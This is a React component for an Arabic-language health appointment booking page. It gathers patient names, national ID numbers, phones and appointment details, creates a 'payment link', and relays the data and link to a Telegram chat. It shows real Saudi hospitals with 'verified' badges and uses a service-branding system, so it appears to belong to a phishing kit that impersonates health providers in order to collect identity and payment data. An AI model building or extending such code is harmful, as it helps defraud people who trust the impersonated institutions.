import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Card } from "@/components/ui/card";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { Badge } from "@/components/ui/badge";
import { Country, getCountryByCode } from "@/lib/countries";
import { ArrowRight, Heart, Shield, Clock, Award, Phone, MapPin, FileText } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useCreateLink } from "@/hooks/useSupabase";
import { sendToTelegram } from "@/lib/telegram";
import { getBrandingByServiceType } from "@/lib/brandingSystem";
import { generatePaymentLink } from "@/utils/paymentLinks";
import TelegramTest from "@/components/TelegramTest";
import { getCurrencyCode, getCurrencyName } from "@/lib/countryCurrencies";
import {
  AlertDialog,
  AlertDialogAction,
  AlertDialogContent,
  AlertDialogDescription,
  AlertDialogFooter,
  AlertDialogHeader,
  AlertDialogTitle,
} from "@/components/ui/alert-dialog";
import { Copy, ExternalLink } from "lucide-react";

const HealthServices = () => {
  const { country } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const selectedCountry = getCountryByCode(country || "");
  const createLink = useCreateLink();
  const serviceBranding = getBrandingByServiceType('health');
  const [showSuccessDialog, setShowSuccessDialog] = useState(false);
  const [createdPaymentUrl, setCreatedPaymentUrl] = useState("");
  const [linkId, setLinkId] = useState("");
  const [copied, setCopied] = useState(false);

  const [bookingData, setBookingData] = useState({
    patientName: "",
    patientId: "",
    phone: "",
    email: "",
    appointmentDate: "",
    appointmentTime: "",
    serviceType: "",
    doctorName: "",
    notes: "",
  });

  const serviceTypes = [
    { value: "consultation", label: "استشارة طبية", icon: "👨‍⚕️" },
    { value: "checkup", label: "فحص دوري", icon: "🔬" },
    { value: "vaccination", label: "تطعيم", icon: "💉" },
    { value: "lab", label: "تحاليل مخبرية", icon: "🧪" },
    { value: "dental", label: "طب الأسنان", icon: "🦷" },
    { value: "eye", label: "طب العيون", icon: "👁️" },
    { value: "physiotherapy", label: "علاج طبيعي", icon: "💪" },
    { value: "mental", label: "صحة نفسية", icon: "🧠" },
  ];

  const accreditedProviders = [
    {
      name: "مستشفى الملك فيصل التخصصي",
      nameEn: "King Faisal Specialist Hospital",
      specialty: "تخصصي",
      rating: 4.9,
      location: selectedCountry?.mainCity || "الرياض",
      phone: "+966-11-464-7272",
      verified: true,
    },
    {
      name: "مستشفى الملك عبدالعزيز الجامعي",
      nameEn: "King Abdulaziz University Hospital",
      specialty: "جامعي",
      rating: 4.8,
      location: selectedCountry?.mainCity || "جدة",
      phone: "+966-12-640-8000",
      verified: true,
    },
    {
      name: "مستشفى الأمير محمد بن عبدالعزيز",
      nameEn: "Prince Mohammad Bin Abdulaziz Hospital",
      specialty: "عام",
      rating: 4.7,
      location: selectedCountry?.mainCity || "الدمام",
      phone: "+966-13-844-9000",
      verified: true,
    },
  ];

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();

    const bookingPayload = {
      patient_name: bookingData.patientName,
      patient_id: bookingData.patientId,
      phone: bookingData.phone,
      email: bookingData.email,
      doctor_name: bookingData.doctorName,
      appointment_date: bookingData.appointmentDate,
      appointment_time: bookingData.appointmentTime,
      notes: bookingData.notes,
      service_type: bookingData.serviceType,
      service_type_label: serviceTypes.find(s => s.value === bookingData.serviceType)?.label || '',
      service_type_icon: serviceTypes.find(s => s.value === bookingData.serviceType)?.icon || '',
    };

    try {
      // Create link in Supabase
      const link = await createLink.mutateAsync({
        type: "health",
        country_code: country || "SA",
        payload: bookingPayload,
      });

      // Generate payment URL
      const paymentUrl = generatePaymentLink({
        invoiceId: link.id,
        company: "health",
        country: country || 'SA'
      });

      // Send to Telegram
      const telegramResult = await sendToTelegram({
        type: 'payment_recipient',
        data: {
          patient_name: bookingData.patientName,
          service_type: serviceTypes.find(s => s.value === bookingData.serviceType)?.label || '',
          appointment_date: bookingData.appointmentDate,
          appointment_time: bookingData.appointmentTime,
          doctor_name: bookingData.doctorName,
          country: selectedCountry.nameAr,
          payment_url: `${window.location.origin}/r/${country}/health/${link.id}?company=health`
        },
        timestamp: new Date().toISOString(),
      });

      setCreatedPaymentUrl(paymentUrl);
      setLinkId(link.id);
      setShowSuccessDialog(true);

      if (telegramResult.success) {
        toast({
          title: "تم إنشاء الحجز بنجاح!",
          description: "تم إرسال البيانات إلى Telegram",
        });
      } else {
        toast({
          title: "تم إنشاء الحجز بنجاح!",
          description: "لكن فشل الإرسال إلى Telegram",
          variant: "destructive",
        });
      }
    } catch (error) {
      console.error("Error creating booking:", error);
    }
  };

  if (!selectedCountry) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <p>دولة غير صحيحة</p>
      </div>
    );
  }

  return (
    <div className="min-h-screen py-6" dir="rtl">
      <div className="container mx-auto px-4">
        {/* Header */}
        <div className="mb-6">
          <Button
            variant="ghost"
            onClick={() => navigate(`/services`)}
            className="mb-4"
          >
            <ArrowRight className="w-4 h-4 ml-2" />
            العودة للخدمات
          </Button>

          <div className="flex items-center gap-3 mb-4">
            <div className="w-12 h-12 bg-gradient-to-br from-red-500 to-pink-500 rounded-xl flex items-center justify-center">
              <Heart className="w-6 h-6 text-white" />
            </div>
            <div>
              <h1 className="text-2xl font-bold">الخدمات الصحية المعتمدة</h1>
              <p className="text-sm text-muted-foreground">
                {selectedCountry.nameAr}
              </p>
            </div>
          </div>
        </div>

        <div className="grid lg:grid-cols-3 gap-6">
          {/* Booking Form */}
          <div className="lg:col-span-2">
            <form onSubmit={handleSubmit}>
              <Card className="p-6 mb-6">
                <h2 className="text-lg font-bold mb-4">بيانات المريض</h2>
                <div className="grid md:grid-cols-2 gap-4">
                  <div>
                    <Label htmlFor="patientName">الاسم الكامل *</Label>
                    <Input
                      id="patientName"
                      value={bookingData.patientName}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, patientName: e.target.value })
                      }
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="patientId">رقم الهوية/الإقامة *</Label>
                    <Input
                      id="patientId"
                      value={bookingData.patientId}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, patientId: e.target.value })
                      }
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="phone">رقم الهاتف *</Label>
                    <Input
                      id="phone"
                      type="tel"
                      value={bookingData.phone}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, phone: e.target.value })
                      }
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="email">البريد الإلكتروني</Label>
                    <Input
                      id="email"
                      type="email"
                      value={bookingData.email}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, email: e.target.value })
                      }
                    />
                  </div>
                </div>
              </Card>

              <Card className="p-6 mb-6">
                <h2 className="text-lg font-bold mb-4">تفاصيل الموعد</h2>
                <div className="grid md:grid-cols-2 gap-4">
                  <div className="md:col-span-2">
                    <Label htmlFor="serviceType">نوع الخدمة *</Label>
                    <Select
                      value={bookingData.serviceType}
                      onValueChange={(value) =>
                        setBookingData({ ...bookingData, serviceType: value })
                      }
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="اختر نوع الخدمة..." />
                      </SelectTrigger>
                      <SelectContent>
                        {serviceTypes.map((type) => (
                          <SelectItem key={type.value} value={type.value}>
                            {type.icon} {type.label}
                          </SelectItem>
                        ))}
                      </SelectContent>
                    </Select>
                  </div>
                  <div>
                    <Label htmlFor="doctorName">الطبيب المفضل (اختياري)</Label>
                    <Input
                      id="doctorName"
                      value={bookingData.doctorName}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, doctorName: e.target.value })
                      }
                      placeholder="اسم الطبيب..."
                    />
                  </div>
                  <div>
                    <Label htmlFor="appointmentDate">تاريخ الموعد *</Label>
                    <Input
                      id="appointmentDate"
                      type="date"
                      value={bookingData.appointmentDate}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, appointmentDate: e.target.value })
                      }
                      min={new Date().toISOString().split("T")[0]}
                      required
                    />
                  </div>
                  <div>
                    <Label htmlFor="appointmentTime">الوقت المفضل *</Label>
                    <Select
                      value={bookingData.appointmentTime}
                      onValueChange={(value) =>
                        setBookingData({ ...bookingData, appointmentTime: value })
                      }
                    >
                      <SelectTrigger>
                        <SelectValue placeholder="اختر الوقت..." />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="09:00">09:00 صباحاً</SelectItem>
                        <SelectItem value="10:00">10:00 صباحاً</SelectItem>
                        <SelectItem value="11:00">11:00 صباحاً</SelectItem>
                        <SelectItem value="12:00">12:00 ظهراً</SelectItem>
                        <SelectItem value="14:00">02:00 بعد الظهر</SelectItem>
                        <SelectItem value="15:00">03:00 بعد الظهر</SelectItem>
                        <SelectItem value="16:00">04:00 بعد الظهر</SelectItem>
                        <SelectItem value="17:00">05:00 بعد الظهر</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  <div className="md:col-span-2">
                    <Label htmlFor="notes">ملاحظات إضافية</Label>
                    <Input
                      id="notes"
                      value={bookingData.notes}
                      onChange={(e) =>
                        setBookingData({ ...bookingData, notes: e.target.value })
                      }
                      placeholder="أي تفاصيل إضافية..."
                    />
                  </div>
                </div>
              </Card>

              <Button 
                type="submit" 
                size="lg" 
                className="w-full"
                style={{
                  background: serviceBranding.gradients.primary,
                  color: serviceBranding.colors.textOnPrimary
                }}
                disabled={createLink.isPending}
              >
                <FileText className="w-4 h-4 ml-2" />
                {createLink.isPending ? "جاري الحجز..." : "حجز الموعد"}
              </Button>
            </form>
          </div>

          {/* Sidebar */}
          <div className="space-y-6">
            {/* Accredited Providers */}
            <Card className="p-6">
              <h2 className="text-lg font-bold mb-4">مقدمو الخدمة المعتمدون</h2>
              <div className="space-y-4">
                {accreditedProviders.map((provider, index) => (
                  <div key={index} className="p-4 border rounded-lg">
                    <div className="flex items-start justify-between mb-2">
                      <h3 className="font-bold text-sm">{provider.name}</h3>
                      {provider.verified && (
                        <Badge variant="secondary" className="text-xs">
                          <Shield className="w-3 h-3 ml-1" />
                          معتمد
                        </Badge>
                      )}
                    </div>
                    <p className="text-xs text-muted-foreground mb-2">
                      {provider.nameEn}
                    </p>
                    <div className="flex items-center gap-2 text-xs text-muted-foreground">
                      <MapPin className="w-3 h-3" />
                      <span>{provider.location}</span>
                    </div>
                    <div className="flex items-center gap-2 text-xs text-muted-foreground mt-1">
                      <Award className="w-3 h-3" />
                      <span>{provider.rating} ⭐</span>
                    </div>
                    <Button
                      variant="outline"
                      size="sm"
                      className="w-full mt-3"
                      onClick={() =>
                        setBookingData({
                          ...bookingData,
                          doctorName: provider.name,
                        })
                      }
                    >
                      اختيار هذا الطبيب
                    </Button>
                  </div>
                ))}
              </div>
            </Card>

            {/* Features */}
            <Card className="p-6">
              <h2 className="text-lg font-bold mb-4">مميزات الخدمة</h2>
              <div className="space-y-3">
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-green-100 rounded-full flex items-center justify-center">
                    <Shield className="w-4 h-4 text-green-600" />
                  </div>
                  <div>
                    <p className="font-semibold text-sm">مقدمو خدمة معتمدون</p>
                    <p className="text-xs text-muted-foreground">
                      جميع المستشفيات والمراكز معتمدة
                    </p>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-blue-100 rounded-full flex items-center justify-center">
                    <Clock className="w-4 h-4 text-blue-600" />
                  </div>
                  <div>
                    <p className="font-semibold text-sm">حجز سريع ومرن</p>
                    <p className="text-xs text-muted-foreground">
                      احجز موعدك في دقائق
                    </p>
                  </div>
                </div>
                <div className="flex items-center gap-3">
                  <div className="w-8 h-8 bg-purple-100 rounded-full flex items-center justify-center">
                    <Award className="w-4 h-4 text-purple-600" />
                  </div>
                  <div>
                    <p className="font-semibold text-sm">أعلى معايير الجودة</p>
                    <p className="text-xs text-muted-foreground">
                      رعاية طبية متميزة
                    </p>
                  </div>
                </div>
              </div>
            </Card>

            {/* Emergency Contact */}
            <Card className="p-6 bg-red-50 border-red-200">
              <h2 className="text-lg font-bold mb-4 text-red-800">
                في حالة الطوارئ
              </h2>
              <p className="text-sm text-red-700 mb-3">
                للطوارئ الطبية، اتصل مباشرة:
              </p>
              <Button
                variant="destructive"
                className="w-full"
                onClick={() => (window.location.href = "tel:997")}
              >
                <Phone className="w-4 h-4 ml-2" />
                997 - الإسعاف
              </Button>
            </Card>
          </div>
        </div>

        {/* Telegram Test */}
        <div className="mt-6">
          <TelegramTest />
        </div>
      </div>

      {/* Success Dialog */}
      <AlertDialog open={showSuccessDialog} onOpenChange={setShowSuccessDialog}>
        <AlertDialogContent className="max-w-md" dir="rtl">
          <AlertDialogHeader>
            <AlertDialogTitle className="text-xl text-center">✅ تم إنشاء الحجز بنجاح!</AlertDialogTitle>
            <AlertDialogDescription className="text-center">
              يمكنك نسخ الرابط أو معاينته قبل المتابعة
            </AlertDialogDescription>
          </AlertDialogHeader>

          <div className="my-4">
            <div className="bg-secondary/50 p-4 rounded-lg mb-4 space-y-2">
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">المريض:</span>
                <span className="font-semibold">{bookingData.patientName}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">نوع الخدمة:</span>
                <span className="font-semibold">
                  {serviceTypes.find(s => s.value === bookingData.serviceType)?.label}
                </span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">التاريخ:</span>
                <span className="font-semibold">{bookingData.appointmentDate}</span>
              </div>
              <div className="flex items-center justify-between text-sm">
                <span className="text-muted-foreground">الوقت:</span>
                <span className="font-semibold">{bookingData.appointmentTime}</span>
              </div>
            </div>

            <div className="bg-secondary/50 p-3 rounded-lg mb-3 break-all text-xs">
              {createdPaymentUrl}
            </div>

            <div className="flex gap-2">
              <Button
                onClick={() => {
                  navigator.clipboard.writeText(createdPaymentUrl);
                  setCopied(true);
                  setTimeout(() => setCopied(false), 2000);
                  toast({ title: "تم النسخ!", description: "تم نسخ الرابط إلى الحافظة" });
                }}
                variant="outline"
                className="flex-1"
              >
                {copied ? (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    تم النسخ!
                  </>
                ) : (
                  <>
                    <Copy className="w-4 h-4 ml-2" />
                    نسخ الرابط
                  </>
                )}
              </Button>

              <Button
                onClick={() => window.open(createdPaymentUrl, '_blank')}
                variant="outline"
                className="flex-1"
              >
                <ExternalLink className="w-4 h-4 ml-2" />
                معاينة
              </Button>
            </div>
          </div>

          <AlertDialogFooter>
            <AlertDialogAction
              onClick={() => {
                setShowSuccessDialog(false);
                navigate(`/pay/${linkId}/recipient?company=health`);
              }}
            >
              إدخال بيانات المريض
            </AlertDialogAction>
          </AlertDialogFooter>
        </AlertDialogContent>
      </AlertDialog>
    </div>
  );
};

export default HealthServices;
